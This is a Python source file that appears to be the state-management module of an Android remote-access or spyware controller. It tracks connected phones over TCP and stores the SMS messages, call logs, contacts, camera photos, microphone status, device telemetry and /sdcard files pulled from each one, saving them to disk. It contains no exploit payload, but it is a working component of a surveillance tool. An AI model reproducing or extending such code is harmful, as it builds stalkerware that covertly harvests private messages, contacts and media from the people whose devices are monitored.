import asyncio
import io
import json
import time
import zipfile
from typing import Any, Dict, List, Optional, Tuple

from app.config import settings


class ClientSession:
    def __init__(self, client_id: str, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, addr: Tuple[str, int]) -> None:
        self.id: str = client_id
        self.reader: asyncio.StreamReader = reader
        self.writer: asyncio.StreamWriter = writer
        self.addr: Tuple[str, int] = addr
        self.connected_at: float = time.time()
        self.mic_active: bool = False
        self.cameras: List[Dict[str, Any]] = []
        self.latest_photo: Optional[str] = None
        self.latest_photo_bytes: Optional[bytes] = None
        self.latest_contacts: Optional[str] = None
        self.latest_contacts_bytes: Optional[bytes] = None
        self.latest_sms: List[Dict[str, Any]] = []
        self.latest_call_logs: List[Dict[str, Any]] = []
        self.contacts_list: List[Dict[str, Any]] = []
        self.telemetry: Optional[Dict[str, Any]] = None
        self.files_tree: List[Dict[str, Any]] = []
        self.files_current_path: str = "/sdcard"
        self.latest_downloaded_file: Optional[Dict[str, Any]] = None
        self.disconnect_event: asyncio.Event = asyncio.Event()

    def is_connected(self) -> bool:
        if self.writer is None:
            return False
        return not self.writer.is_closing()

    def to_dict(self, is_active: bool = False) -> Dict[str, Any]:
        dev = (self.telemetry or {}).get("device", {})
        battery = (self.telemetry or {}).get("battery", {})
        net = (self.telemetry or {}).get("network", {})
        dev_name = f"{dev.get('manufacturer', '')} {dev.get('model', '')}".strip()
        if not dev_name:
            dev_name = f"Device {self.addr[0]}:{self.addr[1]}"
        return {
            "id": self.id,
            "addr": f"{self.addr[0]}:{self.addr[1]}",
            "ip": self.addr[0],
            "port": self.addr[1],
            "connected_at": self.connected_at,
            "is_active": is_active,
            "device_name": dev_name,
            "model": dev.get("model"),
            "manufacturer": dev.get("manufacturer"),
            "android_version": dev.get("android_version"),
            "battery_level": battery.get("level"),
            "battery_charging": battery.get("charging"),
            "network_type": net.get("type"),
            "mic_active": self.mic_active,
        }


class AppState:
    def __init__(self) -> None:
        self.tcp_server: Optional[asyncio.Server] = None
        self.clients: Dict[str, ClientSession] = {}
        self.active_client_id: Optional[str] = None
        self.listening: bool = False
        self.camera_enabled: bool = settings.enable_camera

        self.persisted_telemetry: Optional[Dict[str, Any]] = None
        self.persisted_sms: List[Dict[str, Any]] = []
        self.persisted_call_logs: List[Dict[str, Any]] = []
        self.persisted_contacts_list: List[Dict[str, Any]] = []
        self.persisted_contacts: Optional[str] = None
        self.persisted_contacts_bytes: Optional[bytes] = None
        self.persisted_photo: Optional[str] = None
        self.persisted_photo_bytes: Optional[bytes] = None
        self.persisted_cameras: List[Dict[str, Any]] = []
        self.persisted_files: List[Dict[str, Any]] = []
        self.persisted_files_path: str = "/sdcard"
        self.persisted_downloaded_file: Optional[Dict[str, Any]] = None

        self.default_disconnect_event: asyncio.Event = asyncio.Event()
        self.load_persisted_state()

    def add_client(self, client: ClientSession) -> None:
        self.clients[client.id] = client
        if self.active_client_id is None or self.active_client_id not in self.clients:
            self.active_client_id = client.id

    def remove_client(self, client_id: str) -> None:
        client = self.clients.pop(client_id, None)
        if client:
            client.disconnect_event.set()
        if self.active_client_id == client_id:
            if self.clients:
                self.active_client_id = next(iter(self.clients.keys()))
            else:
                self.active_client_id = None
                self.default_disconnect_event.set()

    def get_client(self, client_id: str) -> Optional[ClientSession]:
        return self.clients.get(client_id)

    def get_active_client(self) -> Optional[ClientSession]:
        if self.active_client_id and self.active_client_id in self.clients:
            return self.clients[self.active_client_id]
        if self.clients:
            self.active_client_id = next(iter(self.clients.keys()))
            return self.clients[self.active_client_id]
        return None

    def set_active_client(self, client_id: str) -> bool:
        if client_id in self.clients:
            self.active_client_id = client_id
            return True
        return False

    def list_clients(self) -> List[Dict[str, Any]]:
        active_id = self.active_client_id
        res = []
        for cid, client in self.clients.items():
            res.append(client.to_dict(is_active=(cid == active_id)))
        return res

    @property
    def client_reader(self) -> Optional[asyncio.StreamReader]:
        ac = self.get_active_client()
        return ac.reader if ac else None

    @property
    def client_writer(self) -> Optional[asyncio.StreamWriter]:
        ac = self.get_active_client()
        return ac.writer if ac else None

    @property
    def client_addr(self) -> Optional[Tuple[str, int]]:
        ac = self.get_active_client()
        return ac.addr if ac else None

    @property
    def mic_active(self) -> bool:
        ac = self.get_active_client()
        return ac.mic_active if ac else False

    @mic_active.setter
    def mic_active(self, val: bool) -> None:
        ac = self.get_active_client()
        if ac:
            ac.mic_active = val

    @property
    def latest_telemetry(self) -> Optional[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.telemetry is not None:
            return ac.telemetry
        return self.persisted_telemetry

    @latest_telemetry.setter
    def latest_telemetry(self, val: Optional[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.telemetry = val
        self.persisted_telemetry = val

    @property
    def latest_sms(self) -> List[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.latest_sms:
            return ac.latest_sms
        return self.persisted_sms

    @latest_sms.setter
    def latest_sms(self, val: List[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_sms = val
        self.persisted_sms = val

    @property
    def latest_call_logs(self) -> List[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.latest_call_logs:
            return ac.latest_call_logs
        return self.persisted_call_logs

    @latest_call_logs.setter
    def latest_call_logs(self, val: List[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_call_logs = val
        self.persisted_call_logs = val

    @property
    def contacts_list(self) -> List[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.contacts_list:
            return ac.contacts_list
        return self.persisted_contacts_list

    @contacts_list.setter
    def contacts_list(self, val: List[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.contacts_list = val
        self.persisted_contacts_list = val

    @property
    def latest_contacts(self) -> Optional[str]:
        ac = self.get_active_client()
        if ac and ac.latest_contacts:
            return ac.latest_contacts
        return self.persisted_contacts

    @latest_contacts.setter
    def latest_contacts(self, val: Optional[str]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_contacts = val
        self.persisted_contacts = val

    @property
    def latest_contacts_bytes(self) -> Optional[bytes]:
        ac = self.get_active_client()
        if ac and ac.latest_contacts_bytes:
            return ac.latest_contacts_bytes
        return self.persisted_contacts_bytes

    @latest_contacts_bytes.setter
    def latest_contacts_bytes(self, val: Optional[bytes]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_contacts_bytes = val
        self.persisted_contacts_bytes = val

    @property
    def latest_photo(self) -> Optional[str]:
        ac = self.get_active_client()
        if ac and ac.latest_photo:
            return ac.latest_photo
        return self.persisted_photo

    @latest_photo.setter
    def latest_photo(self, val: Optional[str]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_photo = val
        self.persisted_photo = val

    @property
    def latest_photo_bytes(self) -> Optional[bytes]:
        ac = self.get_active_client()
        if ac and ac.latest_photo_bytes:
            return ac.latest_photo_bytes
        return self.persisted_photo_bytes

    @latest_photo_bytes.setter
    def latest_photo_bytes(self, val: Optional[bytes]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_photo_bytes = val
        self.persisted_photo_bytes = val

    @property
    def cameras(self) -> List[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.cameras:
            return ac.cameras
        return self.persisted_cameras

    @cameras.setter
    def cameras(self, val: List[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.cameras = val
        self.persisted_cameras = val

    @property
    def files_tree(self) -> List[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.files_tree:
            return ac.files_tree
        return self.persisted_files

    @files_tree.setter
    def files_tree(self, val: List[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.files_tree = val
        self.persisted_files = val

    @property
    def files_current_path(self) -> str:
        ac = self.get_active_client()
        if ac and ac.files_current_path:
            return ac.files_current_path
        return self.persisted_files_path

    @files_current_path.setter
    def files_current_path(self, val: str) -> None:
        ac = self.get_active_client()
        if ac:
            ac.files_current_path = val
        self.persisted_files_path = val

    @property
    def latest_downloaded_file(self) -> Optional[Dict[str, Any]]:
        ac = self.get_active_client()
        if ac and ac.latest_downloaded_file:
            return ac.latest_downloaded_file
        return self.persisted_downloaded_file

    @latest_downloaded_file.setter
    def latest_downloaded_file(self, val: Optional[Dict[str, Any]]) -> None:
        ac = self.get_active_client()
        if ac:
            ac.latest_downloaded_file = val
        self.persisted_downloaded_file = val

    @property
    def disconnect_event(self) -> asyncio.Event:
        ac = self.get_active_client()
        return ac.disconnect_event if ac else self.default_disconnect_event

    def load_persisted_state(self) -> None:
        try:
            settings.storage_dir.mkdir(parents=True, exist_ok=True)
            telemetry_path = settings.storage_dir / "latest_telemetry.json"
            if telemetry_path.exists():
                self.persisted_telemetry = json.loads(telemetry_path.read_text(encoding="utf-8"))
        except Exception:
            pass

        try:
            sms_path = settings.storage_dir / "latest_sms.json"
            if sms_path.exists():
                self.persisted_sms = json.loads(sms_path.read_text(encoding="utf-8"))
        except Exception:
            pass

        try:
            calls_path = settings.storage_dir / "latest_call_logs.json"
            if calls_path.exists():
                self.persisted_call_logs = json.loads(calls_path.read_text(encoding="utf-8"))
        except Exception:
            pass

        try:
            contacts_path = settings.storage_dir / "contacts.zip"
            if contacts_path.exists():
                data = contacts_path.read_bytes()
                self.persisted_contacts_bytes = data
                self.persisted_contacts = str(contacts_path)
                if zipfile.is_zipfile(io.BytesIO(data)):
                    with zipfile.ZipFile(io.BytesIO(data)) as zf:
                        if "contacts.json" in zf.namelist():
                            with zf.open("contacts.json") as f:
                                self.persisted_contacts_list = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass

        try:
            photos = sorted(settings.storage_dir.glob("photo_*.jpg"), key=lambda p: p.stat().st_mtime, reverse=True)
            if photos:
                self.persisted_photo = str(photos[0])
                self.persisted_photo_bytes = photos[0].read_bytes()
        except Exception:
            pass

        try:
            files_path = settings.storage_dir / "latest_files.json"
            if files_path.exists():
                data = json.loads(files_path.read_text(encoding="utf-8"))
                if isinstance(data, dict):
                    self.persisted_files = data.get("files", [])
                    self.persisted_files_path = data.get("path", "/sdcard")
                elif isinstance(data, list):
                    self.persisted_files = data
        except Exception:
            pass

        if not self.persisted_files:
            from app.tcp.handlers import generate_simulated_files_tree
            self.persisted_files = generate_simulated_files_tree("/sdcard")
            self.persisted_files_path = "/sdcard"

    def clear_all_data(self) -> None:
        for client in self.clients.values():
            client.latest_sms = []
            client.latest_call_logs = []
            client.contacts_list = []
            client.latest_contacts = None
            client.latest_contacts_bytes = None
            client.latest_photo = None
            client.latest_photo_bytes = None
            client.telemetry = None
            client.cameras = []
            client.files_tree = []
            client.latest_downloaded_file = None

        self.persisted_sms = []
        self.persisted_call_logs = []
        self.persisted_contacts_list = []
        self.persisted_contacts = None
        self.persisted_contacts_bytes = None
        self.persisted_telemetry = None
        self.persisted_photo = None
        self.persisted_photo_bytes = None
        self.persisted_cameras = []
        self.persisted_files = []
        self.persisted_downloaded_file = None
        try:
            if settings.storage_dir.exists():
                for filename in ["contacts.zip", "latest_sms.json", "latest_call_logs.json", "latest_telemetry.json", "latest_files.json"]:
                    target = settings.storage_dir / filename
                    if target.exists():
                        target.unlink(missing_ok=True)
                for photo in settings.storage_dir.glob("photo_*.jpg"):
                    photo.unlink(missing_ok=True)
        except Exception:
            pass

    def client_connected(self) -> bool:
        return len(self.clients) > 0

    def clear_client(self) -> None:
        ac = self.get_active_client()
        if ac:
            self.remove_client(ac.id)


state = AppState()
